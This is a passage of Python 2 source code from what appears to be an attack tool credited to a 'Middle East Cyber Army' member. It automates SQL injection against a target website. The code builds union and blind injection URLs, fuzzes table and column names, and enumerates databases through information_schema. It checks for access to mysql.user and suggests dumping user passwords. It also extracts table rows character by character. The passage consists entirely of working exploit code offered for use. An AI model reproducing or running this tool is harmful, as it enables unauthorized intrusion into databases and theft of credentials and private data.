        fuzz_columns = open(columnfuzz, "r").readlines()
        print "[+] Beginning table and column fuzzer...";file.write("[+] Beginning table and column fuzzer...")
        print "[+] Number of tables names to be fuzzed:",len(fuzz_tables);file.write("\n[+] Number of tables names to be fuzzed: "+str(len(fuzz_tables)))
        print "[+] Number of column names to be fuzzed:",len(fuzz_columns);file.write("\n[+] Number of column names to be fuzzed: "+str(len(fuzz_columns)))
        print "[+] Searching for tables and columns...";file.write("\n[+] Searching for tables and columns...")
        if arg_blind == "--blind":
                fuzz_URL = site+"+and+(SELECT+1+from+TABLE+limit+0,1)=1"
        else:
                fuzz_URL = site.replace("MECA","0x"+"MECA".encode("hex"))+"+FROM+TABLE"+arg_end
        for table in fuzz_tables:
                table = table.rstrip("\n")
                table_URL = fuzz_URL.replace("TABLE",table)
                source = GetThatShit(table_URL)
                if arg_blind == "--blind":
                        match = re.findall(arg_string,source)
                else:
                        match = re.findall("MECA", source);
                if len(match) > 0:
                        print "\n[!] Found a table called:",table;file.write("\n\n[+] Found a table called: "+str(table))
                        print "\n[+] Now searching for columns inside table \""+table+"\"";file.write("\n\n[+] Now searching for columns inside table \""+str(table)+"\"")
                        if arg_blind == "--blind":
                                table_URL = site+"+and+(SELECT+substring(concat(1,COLUMN),1,1)+from+"+table+"+limit+0,1)=1"
                        for column in fuzz_columns:
                                column = column.rstrip("\n")
                                if arg_blind == "--blind":
                                        column_URL = table_URL.replace("COLUMN",column)
                                else:
                                        column_URL = table_URL.replace("0x6461726b63306465","concat(0x6461726b63306465,0x3a,"+column+")")
                                source = GetThatShit(column_URL)
                                if arg_blind == "--blind":
                                        match = re.findall(arg_string,source)     
                                else:
                                        match = re.findall("MECA",source)
                                if len(match) > 0:
                                        print "[!] Found a column called:",column;file.write("\n[!] Found a column called:"+column)	
                        print "[-] Done searching inside table \""+table+"\" for columns!";file.write("\n[-] Done searching inside table \""+str(table)+"\" for columns!")

if mode == "--schema":
    
    if arg_database != "None" and arg_table == "None":
            
        if arg_blind == "--blind":
                
            print "[+] Showing Tables from database \""+arg_database+"\"";file.write("\n[+] Showing Tables from database \""+arg_database+"\"")
            count_URL = site+"+and+((SELECT+COUNT(table_name)"
            count_URL += "+FROM+information_schema.TABLES+WHERE+table_schema=0x"+arg_database.encode("hex")+"))"
            line_URL = site+"+and+ascii(substring((SELECT+table_name"
            line_URL += "+FROM+information_schema.TABLES+WHERE+table_schema=0x"+arg_database.encode("hex")
        else:
            print "[+] Showing Tables & Columns from database \""+arg_database+"\""
            file.write("\n[+] Showing Tables & Columns from database \""+arg_database+"\"")
            line_URL = site.replace("MECA","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)")
            line_URL += "+FROM+information_schema.columns+WHERE+table_schema=0x"+arg_database.encode("hex")
            count_URL = site.replace("MECA","concat(0x1e,0x1e,COUNT(table_schema),0x1e,0x20)")
            count_URL += "+FROM+information_schema.tables+WHERE+table_schema=0x"+arg_database.encode("hex")
            arg_row = "Tables"
        if arg_database != "None" and arg_table != "None":
            
            if arg_blind == "--blind":
                print "[+] Showing Columns from database \""+arg_database+"\" and Table \""+arg_table+"\""
                file.write("\n[+] Showing Columns from database \""+arg_database+"\" and Table \""+arg_table+"\"")
                count_URL = site+"+and+((SELECT+COUNT(column_name)"
                count_URL += "+FROM+information_schema.COLUMNS+WHERE+table_schema=0x"+arg_database.encode("hex")+"+AND+table_name+=+0x"+arg_table.encode("hex")+"))"
                line_URL = site+"+and+ascii(substring((SELECT+column_name"
                line_URL += "+FROM+information_schema.COLUMNS+WHERE+table_schema=0x"+arg_database.encode("hex")+"+AND+table_name+=+0x"+arg_table.encode("hex")
            else:
                print "[+] Showing Columns from Database \""+arg_database+"\" and Table \""+arg_table+"\""
                file.write("\n[+] Showing Columns from database \""+arg_database+"\" and Table \""+arg_table+"\"")
                line_URL = site.replace("MECA","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)")
                line_URL += "+FROM+information_schema.COLUMNS+WHERE+table_schema=0x"+arg_database.encode("hex")+"+AND+table_name+=+0x"+arg_table.encode("hex")
                count_URL = site.replace("MECA","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")
                count_URL += "+FROM+information_schema.COLUMNS+WHERE+table_schema=0x"+arg_database.encode("hex")+"+AND+table_name+=+0x"+arg_table.encode("hex")



	    arg_row = "Columns"

elif mode == "--dump":                
	print "[+] Dumping data from database \""+str(arg_database)+"\" Table \""+str(arg_table)+"\""
	file.write("\n[+] Dumping data from database \""+str(arg_database)+"\" Table \""+str(arg_table)+"\"")
        print "[+] and Column(s) "+str(arg_columns);file.write("\n[+] Column(s) "+str(arg_columns))
        if arg_blind == "--blind":
                MECA = ""
                for column in arg_columns:
                        MECA += column+",0x3a,"
                MECA = MECA.rstrip("0x3a,")
                count_URL = site+"+and+((SELECT+COUNT(*)+FROM+"+arg_database+"."+arg_table
                line_URL = site+"+and+ascii(substring((SELECT+concat("+MECA+")+FROM+"+arg_database+"."+arg_table
        else:
                for column in arg_columns:
                        MECA += column+",0x1e,"
                count_URL = site.replace("MECA","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")+"+FROM+"+arg_database+"."+arg_table
                line_URL = site.replace("MECA",MECA+"0x1e,0x20)")+"+FROM+"+arg_database+"."+arg_table
        if arg_where != "" or arg_orderby != "":
                if arg_where != "":
                        arg_where = arg_where.split(",")
                        print "[+] WHERE clause:","\""+arg_where[0]+"="+arg_where[1]+"\""
                        arg_where = "WHERE+"+arg_where[0]+"="+"0x"+arg_where[1].encode("hex")
                if arg_orderby != "":
                        arg_orderby = "ORDER+BY+'"+arg_orderby+"'"
                        print "[+] ORDERBY clause:",arg_orderby
                count_URL += "+"+arg_where
                line_URL += "+"+arg_where+"+"+arg_orderby
        if version[0] == 4:
                count_URL = site.replace("MECA","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")+"+FROM+"+arg_table
        	line_URL = site.replace("MECA",MECA+"0x1e,0x20)")+"+FROM+"+arg_table

elif mode == "--full":
	print "[+] Starting full SQLi information_schema enumeration..."
	line_URL = site.replace("MECA","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)")
	line_URL += "+FROM+information_schema.columns+WHERE+table_schema!=0x"+"information_schema".encode("hex")
        count_URL = site.replace("MECA","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")
        count_URL += "+FROM+information_schema.columns+WHERE+table_schema!=0x"+"information_schema".encode("hex")
		
elif mode == "--dbs":
	print "[+] Showing all databases current user has access too!"
	file.write("\n[+] Showing all databases current user has access too!")
        if arg_blind == "--blind":
                count_URL = site+"+and+((SELECT+COUNT(schema_name)"
                count_URL += "+FROM+information_schema.schemata+where+schema_name+!=+0x"+"information_schema".encode("hex")+"))"
                line_URL = site+"+and+ascii(substring((SELECT+schema_name"
                line_URL += "+from+information_schema.schemata+where+schema_name+!=+0x"+"information_schema".encode("hex")
        else:
                count_URL = site.replace("MECA","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")
                count_URL += "+FROM+information_schema.schemata+WHERE+schema_name!=0x"+"information_schema".encode("hex")
                line_URL = site.replace("MECA","concat(0x1e,0x1e,schema_name,0x1e,0x20)")
                line_URL += "+FROM+information_schema.schemata+WHERE+schema_name!=0x"+"information_schema".encode("hex")
	arg_row = "Databases"

if arg_blind == "--blind":
        count_URL+="))"
        line_URL+="+LIMIT+"
else:
        count_URL += arg_end
        line_URL += "+LIMIT+NUM,1"+arg_end
        
## Blind Info --- I know it doesnt make sence where this code is.. but.. fuck it...
if mode == "--info" and arg_blind == "--blind":
        head_URL = site+"+and+(SELECT+1+from+mysql.user+limit+0,1)=1"
        source = GetThatShit(head_URL)
        match = re.findall(arg_string,source)
        if len(match) >= 1:
                yesno = "YES <-- w00t w00t\n[!] Retrieve Info: --dump -D mysql -T user -C user,password"
        else:
                yesno = "NO"
        print "\n[+] Do we have Access to MySQL Database:",yesno;file.write("\n\n[+] Do we have Access to MySQL Database: "+str(yesno))
        print "\n[+] Showing database version, username@location, and database name!"
	file.write("\n\n[+] Showing database version, username@location, and database name!")
	line_URL = site+"+and+ascii(substring((SELECT+concat(version(),0x3a,user(),0x3a,database())),"
        row_value = 1

if mode == "--schema" or mode == "--dump" or mode == "--dbs" or mode == "--full":
        if arg_blind == "--blind":
                row_value = GuessValue(count_URL)
        else:
                source = GetThatShit(count_URL)
                match = re.findall("\x1e\x1e\S+",source)
                match = match[0][2:].split("\x1e")
                row_value = match[0]
        print "[+] Number of "+arg_row+": "+str(row_value);file.write("\n[+] Number of "+arg_row+": "+str(row_value)+"\n")

if arg_blind == "--union":
        if mode == "--schema" or mode == "--dump" or mode == "--dbs" or mode == "--full":
                while int(table_num) != int(row_value):
                        try:
                                source = GetThatShit(line_URL.replace("NUM",str(num)))
                                match = re.findall("\x1e\x1e\S+",source)
                                if len(match) >= 1:
                                        if mode == "--schema" or mode == "--full":
                                                match = match[0][2:].split("\x1e")
                                                if cur_db != match[0]:			
                                                        cur_db = match[0]
                                                        if table_num == 0:
                                                                print "\n[Database]: "+match[0];file.write("\n[Database]: "+match[0]+"\n")
                                                        else:
                                                                print "\n\n[Database]: "+match[0];file.write("\n\n[Database]: "+match[0]+"\n")
                                                        print "  [Table] >>> \n  ------------- \n\t[Columns]";file.write("[Table: Columns]\n")
                                                if cur_table != match[1]:
                                                        print "\n\n "+match[1]+" >>>\n ---------------------"+"\n\t"+match[2],
                                                        
                                                        file.write("\n\n["+str(table_num+1)+"]"+match[1]+" >>>\n ---------------------"+"\n\t"+match[2])
                                                        
                                                        cur_table = match[1]
                                                        
                                                        table_num = int(table_num) + 1
                                                else:
                                                        sys.stdout.write("\n\t%s" % (match[2]))
                                                        file.write("\n\t"+match[2])
                                                        sys.stdout.flush()
                                        
                                        elif mode == "--dbs":                                        
                                                match = match[0]
                                                if table_num == 0:
                                                        print "\n["+str(num+1)+"]",match;file.write("\n["+str(num+1)+"]"+str(match))
                                                else:
                                                        print "["+str(num+1)+"]",match;file.write("\n["+str(num+1)+"]"+str(match))
                                                table_num+=1
                                        
                                        elif mode == "--dump":
                                                match = re.findall("\x1e\x1e+.+\x1e\x1e",source)
                                                if match == []:
                                                        match = ['']
                                                else:
                                                        match = match[0].strip("\x1e").split("\x1e")
                                                if arg_rowdisp == 1:
                                                        print '\n\n--------------------'  ;file.write( '\n\n--------------------' )     
                                                        print "  Row  Number "+str(num+1)+" >>>", ;file.write(" Row  Number "+str(num+1)+" :",) 
                                                        print '\n--------------------\n\n' ;file.write( '\n--------------------\n\n')     
                                                else:
                                                        print;file.write("\n")
                                                
                                                for ddata in match:
                                                        if '>' in ddata  or '<' in ddata :
														    match.remove(ddata)
                                                        
                                                for ddata in match:
                                                        if ddata == '' :
														    match.remove(ddata)          
                                                RebelGhost(match)        
                                                Gh = 0       
                                                for ddata in See:
                                                        if ddata == '' :
														    See.remove(ddata)        
                                                while Gh<len(See):      
                                                        print '\t==============================================================='  ;file.write('\n===============================================================\n')      
                                                        
                                                        print '\t    '+arg_columns[Gh]+' >>> '+See[Gh]    ;file.write('  '+arg_columns[Gh]+' >>> '+See[Gh])
                                                        
                                                        print '\t==============================================================='; file.write('\n===============================================================\n')        
                                                        
                                                        sys.stdout.flush()
                                                        Gh = Gh+1
                                                table_num+=1
                                else:
                                        if mode == "--dump":
                                                table_num+=1
                                                sys.stdout.write("\n[%s] No data" % (num))
                                                file.write("\n[%s] No data" % (num))
                                        break
                                num+=1
                        except (KeyboardInterrupt, SystemExit):
                                raise
                        except:
                                pass


if arg_blind == "--blind":
        if mode == "--schema" or mode == "--dbs" or mode == "--dump" or mode == "--info":
                lower_bound = 0
                upper_bound = 127
                print
                for data_row in range(int(num), row_value):
                        sys.stdout.write("[%s]: " % (lim_num))
                        file.write("\n[%s]: " % (lim_num))
                        sys.stdout.flush()
                        value = chr(upper_bound)
                        while value != chr(0):
                                if mode == "--info":	
                                        Guess_URL = line_URL + str(let_pos)+",1))"
                                else:
                                        Guess_URL = line_URL + str(lim_num) +",1),"+str(let_pos)+",1))"
                                value = chr(GuessValue(Guess_URL))
                                sys.stdout.write("%s" % (value))
                                file.write(value)
                                sys.stdout.flush()
                                let_pos+=1
                        print
                        lim_num = int(lim_num) + 1
                        let_pos = 1
                        data_row+=1




print "\n\n[-] Total URL Requests:",gets;file.write("\n[-] Total URL Requests: "+str(gets))
print "[-] Job Done ^_^\n";file.write("\n[-] Job Done ^_^\n")


print '==============================================================' 
print '^_^ Coded By RebelGhost-DX .. Middle East Cyber Army! Team ^_^ ' 
print '              [-]--- Job Finished --- [-]'
file.close()
